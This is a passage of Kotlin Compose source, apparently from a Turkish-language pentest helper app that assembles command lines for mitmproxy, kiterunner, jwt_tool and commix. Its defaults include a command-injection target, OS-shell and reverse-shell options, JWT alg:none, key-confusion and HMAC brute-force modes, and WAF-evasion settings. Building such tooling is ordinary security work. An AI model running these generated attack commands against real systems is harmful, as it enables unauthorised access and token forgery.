        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("--proxy", proxyUrl.trim()))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 27. MITMPROXY
@Composable
fun MitmproxyBuilder(language: AppLanguage) {
    var toolMode by remember { mutableStateOf("mitmweb") }
    var listenPort by remember { mutableStateOf("8080") }
    var listenHost by remember { mutableStateOf("0.0.0.0") }
    var proxyMode by remember { mutableStateOf("regular") }
    var reverseTarget by remember { mutableStateOf("https://target.com") }
    var flowFilter by remember { mutableStateOf("~m post & ~c 200") }
    var saveFlowsFile by remember { mutableStateOf("capture.mitm") }
    var addonScript by remember { mutableStateOf("") }
    var sslInsecure by remember { mutableStateOf(true) }
    var anticache by remember { mutableStateOf(true) }
    var anticomp by remember { mutableStateOf(true) }

    Column {
        Text(text = "ÇALIŞTIRMA ARACI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("mitmweb" to "Web Arayüzü (mitmweb)", "mitmproxy" to "Terminal UI (mitmproxy)", "mitmdump" to "Komut Satırı (mitmdump)").forEach { (m, lbl) ->
                val isSelected = toolMode == m
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { toolMode = m }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = listenHost,
                onValueChange = { listenHost = it },
                label = { Text("Dinleme Hostu (--listen-host)") },
                modifier = Modifier.weight(1.2f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = listenPort,
                onValueChange = { listenPort = it },
                label = { Text("Port (-p)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PROXY ÇALIŞMA MODU (--mode)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("regular" to "Normal (Forward)", "reverse" to "Ters Proxy (Reverse)", "transparent" to "Şeffaf (Transparent)", "socks5" to "SOCKS5").forEach { (pm, lbl) ->
                val isSelected = proxyMode == pm
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { proxyMode = pm }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        if (proxyMode == "reverse") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = reverseTarget,
                onValueChange = { reverseTarget = it },
                label = { Text("Yönlendirilecek Hedef (https://target.com)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "FİLTRELER VE EKLENTİLER", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        OutlinedTextField(
            value = flowFilter,
            onValueChange = { flowFilter = it },
            label = { Text("Trafik Filtresi (~m post & ~u login & ~c 200)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = addonScript,
            onValueChange = { addonScript = it },
            label = { Text("Özel Python Script Eklentisi (-s script.py) - Opsiyonel") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--ssl-insecure Geçersiz SSL Sertifikalarını Kabul Et", checked = sslInsecure, onCheckedChange = { sslInsecure = it })
        ToggleOption(label = "--anticache Sunucu Önbellek Başlıklarını Temizle", checked = anticache, onCheckedChange = { anticache = it })
        ToggleOption(label = "--anticomp Sıkıştırılmış Yanıtları Düz Metne Çöz", checked = anticomp, onCheckedChange = { anticomp = it })

        // Live Command Synthesis
        val parts = mutableListOf(toolMode)
        parts.addAll(listOf("-p", listenPort.trim(), "--listen-host", listenHost.trim()))

        if (proxyMode == "reverse") {
            parts.addAll(listOf("--mode", "reverse:${reverseTarget.trim()}"))
        } else if (proxyMode != "regular") {
            parts.addAll(listOf("--mode", proxyMode))
        }

        if (sslInsecure) parts.add("--ssl-insecure")
        if (anticache) parts.add("--anticache")
        if (anticomp) parts.add("--anticomp")
        if (saveFlowsFile.isNotBlank()) parts.addAll(listOf("-w", saveFlowsFile.trim()))
        if (addonScript.isNotBlank()) parts.addAll(listOf("-s", addonScript.trim()))
        if (flowFilter.isNotBlank()) parts.addAll(listOf("--view-filter", "\"${flowFilter.trim()}\""))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 28. KITERUNNER
@Composable
fun KiterunnerBuilder(language: AppLanguage) {
    var command by remember { mutableStateOf("scan") }
    var targetUrl by remember { mutableStateOf("https://api.target.com") }
    var isHostList by remember { mutableStateOf(false) }
    var dataset by remember { mutableStateOf("routes-large.kite") }
    var customWordlist by remember { mutableStateOf("") }
    var concurrency by remember { mutableStateOf("50") }
    var maxRetries by remember { mutableStateOf("10") }
    var timeout by remember { mutableStateOf("5s") }
    var filterApiCodes by remember { mutableStateOf("200,301,302,401,403") }
    var failStatusCodes by remember { mutableStateOf("404,500") }
    var customAuthHeader by remember { mutableStateOf("") }
    var insecureSsl by remember { mutableStateOf(true) }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }
    var outputFormat by remember { mutableStateOf("json") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            ToggleChip("scan (Akıllı Rota Taraması)", command == "scan", modifier = Modifier.weight(1f)) { command = "scan" }
            ToggleChip("brute (Sözlük Kaba Kuvveti)", command == "brute", modifier = Modifier.weight(1f)) { command = "brute" }
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            ToggleChip("Tek Hedef URL", !isHostList, modifier = Modifier.weight(1f)) { isHostList = false }
            ToggleChip("Hedefler Listesi (-A)", isHostList, modifier = Modifier.weight(1f)) { isHostList = true }
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = targetUrl,
            onValueChange = { targetUrl = it },
            label = { Text(if (isHostList) "Hedefler Dosyası (-A hosts.txt)" else "API Hedef URL (https://api.target.com)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ROTA VE VERİ SETİ (KITE DATASET)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("routes-large.kite" to "Büyük Set (large)", "routes-small.kite" to "Küçük Set (small)", "custom" to "Özel").forEach { (ds, lbl) ->
                val isSelected = dataset == ds
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { dataset = ds }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        if (dataset == "custom") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = customWordlist,
                onValueChange = { customWordlist = it },
                label = { Text("Özel Kelime Listesi / Swagger Spec Yolu") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "FİLTRELER VE DURUM KODLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = filterApiCodes,
                onValueChange = { filterApiCodes = it },
                label = { Text("Eşleşen Kodlar (--filter-api)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = failStatusCodes,
                onValueChange = { failStatusCodes = it },
                label = { Text("Hata Kodları (--fail-status-codes)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = customAuthHeader,
            onValueChange = { customAuthHeader = it },
            label = { Text("Yetkilendirme Başlığı (-H 'Authorization: Bearer ..')") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-k SSL Sertifika Doğrulamasını Atla", checked = insecureSsl, onCheckedChange = { insecureSsl = it })
        ToggleOption(label = "Proxy Kullan (--proxy $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        // Live Command Synthesis
        val parts = mutableListOf("kr", command)
        if (isHostList) parts.addAll(listOf("-A", targetUrl.trim())) else parts.add(targetUrl.trim())

        val dsFile = if (dataset == "custom") customWordlist.trim() else dataset
        if (dsFile.isNotBlank()) parts.addAll(listOf("-w", dsFile))

        if (filterApiCodes.isNotBlank()) parts.addAll(listOf("--filter-api", filterApiCodes.trim()))
        if (failStatusCodes.isNotBlank()) parts.addAll(listOf("--fail-status-codes", failStatusCodes.trim()))
        if (customAuthHeader.isNotBlank()) parts.addAll(listOf("-H", "\"${customAuthHeader.trim()}\""))
        if (insecureSsl) parts.add("-k")
        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("--proxy", proxyUrl.trim()))
        parts.addAll(listOf("-c", concurrency.trim(), "-x", maxRetries.trim(), "--timeout", timeout.trim()))

        when (outputFormat) {
            "json" -> parts.addAll(listOf("-o", "json", ">", "kiterunner_results.json"))
            "text" -> parts.addAll(listOf("-o", "text", ">", "kiterunner_results.txt"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 29. JWT_TOOL
@Composable
fun JwtToolBuilder(language: AppLanguage) {
    var jwtToken by remember { mutableStateOf("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c") }
    var targetUrl by remember { mutableStateOf("https://target.com/api/profile") }
    var attackMode by remember { mutableStateOf("alg_none") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/rockyou.txt") }
    var tamperClaimKey by remember { mutableStateOf("admin") }
    var tamperClaimValue by remember { mutableStateOf("true") }
    var customAuthHeader by remember { mutableStateOf("Authorization: Bearer") }
    var proxyBurp by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(
            value = jwtToken,
            onValueChange = { jwtToken = it },
            label = { Text("Hedef JWT Token (header.payload.signature)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = targetUrl,
            onValueChange = { targetUrl = it },
            label = { Text("Hedef API Endpoint (-t https://...) - Opsiyonel") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = customAuthHeader,
            onValueChange = { customAuthHeader = it },
            label = { Text("İstek Başlığı (-rh 'Authorization: Bearer')") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "SALDIRI VE TEST MODU (-X)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("alg_none" to "Alg:None (-X a)", "key_conf" to "Key Confusion (-X k)", "null_sig" to "Null Sig (-X n)").forEach { (m, lbl) ->
                val isSelected = attackMode == m
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { attackMode = m }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        Row(modifier = Modifier.fillMaxWidth().padding(top = 4.dp), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("tamper" to "Claim Değiştir (-T)", "brute" to "HMAC Kır (-d)", "all" to "Tüm Testler (-M at)").forEach { (m, lbl) ->
                val isSelected = attackMode == m
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { attackMode = m }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        if (attackMode == "tamper") {
            Spacer(modifier = Modifier.height(6.dp))
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                OutlinedTextField(
                    value = tamperClaimKey,
                    onValueChange = { tamperClaimKey = it },
                    label = { Text("Claim Anahtarı (-pc)") },
                    modifier = Modifier.weight(1f),
                    colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                    singleLine = true
                )
                OutlinedTextField(
                    value = tamperClaimValue,
                    onValueChange = { tamperClaimValue = it },
                    label = { Text("Claim Değeri (-pv)") },
                    modifier = Modifier.weight(1f),
                    colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                    singleLine = true
                )
            }
        } else if (attackMode == "brute") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = wordlist,
                onValueChange = { wordlist = it },
                label = { Text("HMAC Parola Listesi (-d)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "OTOMASYON VE ENTEGRASYON", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-M pb İstekleri Burp Suite (127.0.0.1:8080) Üzerinden Yönlendir", checked = proxyBurp, onCheckedChange = { proxyBurp = it })

        // Live Command Synthesis
        val parts = mutableListOf("python3", "jwt_tool.py", jwtToken.trim())
        if (targetUrl.isNotBlank()) {
            parts.addAll(listOf("-t", targetUrl.trim()))
            if (customAuthHeader.isNotBlank()) parts.addAll(listOf("-rh", "\"${customAuthHeader.trim()}\""))
        }

        when (attackMode) {
            "alg_none" -> parts.addAll(listOf("-X", "a"))
            "key_conf" -> parts.addAll(listOf("-X", "k", "-pk", "public.pem"))
            "null_sig" -> parts.addAll(listOf("-X", "n"))
            "tamper" -> parts.addAll(listOf("-T", "-I", "-pc", tamperClaimKey.trim(), "-pv", tamperClaimValue.trim()))
            "brute" -> parts.addAll(listOf("-d", wordlist.trim()))
            "all" -> parts.addAll(listOf("-M", "at"))
        }

        if (proxyBurp) parts.addAll(listOf("-M", "pb"))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 30. COMMIX
@Composable
fun CommixBuilder(language: AppLanguage) {
    var targetUrl by remember { mutableStateOf("http://10.10.10.100/vuln.php?cmd=whoami") }
    var isRequestFile by remember { mutableStateOf(false) }
    var targetParam by remember { mutableStateOf("cmd") }
    var technique by remember { mutableStateOf("all") }
    var level by remember { mutableStateOf("3") }
    var targetOs by remember { mutableStateOf("Unix") }
    var shellAction by remember { mutableStateOf("os_shell") }
    var customCommand by remember { mutableStateOf("id; whoami; uname -a") }
    var reverseShellTarget by remember { mutableStateOf("LHOST=10.10.14.5 LPORT=4444") }
    var tamperScript by remember { mutableStateOf("none") }
    var batchMode by remember { mutableStateOf(true) }
    var randomAgent by remember { mutableStateOf(true) }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            ToggleChip("Hedef URL (--url)", !isRequestFile, modifier = Modifier.weight(1f)) { isRequestFile = false }
            ToggleChip("İstek Dosyası (-r)", isRequestFile, modifier = Modifier.weight(1f)) { isRequestFile = true }
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = targetUrl,
            onValueChange = { targetUrl = it },
            label = { Text(if (isRequestFile) "Raw HTTP İstek Dosyası (-r request.txt)" else "Hedef URL (--url)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = targetParam,
                onValueChange = { targetParam = it },
                label = { Text("Hedef Parametre (-p cmd: opsiyonel)") },
                modifier = Modifier.weight(1.2f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = level,
                onValueChange = { level = it },
                label = { Text("Level (1-3)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ENJEKSİYON TEKNİĞİ (--tech)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("all" to "Tümü", "classic" to "Classic", "eval-based" to "Eval", "time-based" to "Time", "file-based" to "File").forEach { (tech, lbl) ->
                val isSelected = technique == tech
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { technique = tech }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = tamperScript,
            onValueChange = { tamperScript = it },
            label = { Text("Tamper Scripti (--tamper: space2comment, base64encode vb. - 'none' pasif)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "HEDEF İŞLETİM SİSTEMİ (--os)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("Unix" to "Linux / Unix", "Windows" to "Microsoft Windows").forEach { (os, lbl) ->
                val isSelected = targetOs == os
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { targetOs = os }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "İSTİSMAR VE SHELL SEÇENEKLERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("os_shell" to "İnteraktif Kabuk (--os-shell)", "os_cmd" to "Tek Komut (--os-cmd)", "rev_shell" to "Reverse Shell").forEach { (act, lbl) ->
                val isSelected = shellAction == act
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { shellAction = act }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        if (shellAction == "os_cmd") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = customCommand,
                onValueChange = { customCommand = it },
                label = { Text("Çalıştırılacak Komut (--os-cmd)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        } else if (shellAction == "rev_shell") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = reverseShellTarget,
                onValueChange = { reverseShellTarget = it },
                label = { Text("Reverse Shell Hedefi (LHOST=.. LPORT=..)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "WAF ATLATMA VE BAĞLANTI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "--batch Sorulara Otomatik Varsayılan Cevap Ver", checked = batchMode, onCheckedChange = { batchMode = it })
        ToggleOption(label = "--random-agent Rastgele User-Agent Rotasyonu", checked = randomAgent, onCheckedChange = { randomAgent = it })
        ToggleOption(label = "Proxy Kullan (--proxy $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        // Live Command Synthesis
        val parts = mutableListOf("commix")
        if (isRequestFile) parts.addAll(listOf("-r", targetUrl.trim())) else parts.add("--url=\"${targetUrl.trim()}\"")
        if (targetParam.isNotBlank()) parts.addAll(listOf("-p", targetParam.trim()))

        parts.addAll(listOf("--os=$targetOs", "--level=$level"))
        if (technique != "all") parts.add("--tech=$technique")
        if (tamperScript != "none" && tamperScript.isNotBlank()) parts.add("--tamper=$tamperScript")

        when (shellAction) {
            "os_shell" -> parts.add("--os-shell")
            "os_cmd" -> parts.add("--os-cmd=\"${customCommand.trim()}\"")
            "rev_shell" -> parts.addAll(listOf("--reverse-shell", "\"${reverseShellTarget.trim()}\""))
        }

        if (batchMode) parts.add("--batch")
        if (randomAgent) parts.add("--random-agent")
        if (useProxy && proxyUrl.isNotBlank()) parts.add("--proxy=\"${proxyUrl.trim()}\"")

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 22. WAFW00F
@Composable
fun Wafw00fBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("https://example.com") }
    var testAll by remember { mutableStateOf(true) }
    var proxy by remember { mutableStateOf(false) }
    var saveOutput by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef URL veya Host") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-a Eşleşen Tüm WAF'ları Bul (İlkinde durma)", checked = testAll, onCheckedChange = { testAll = it })
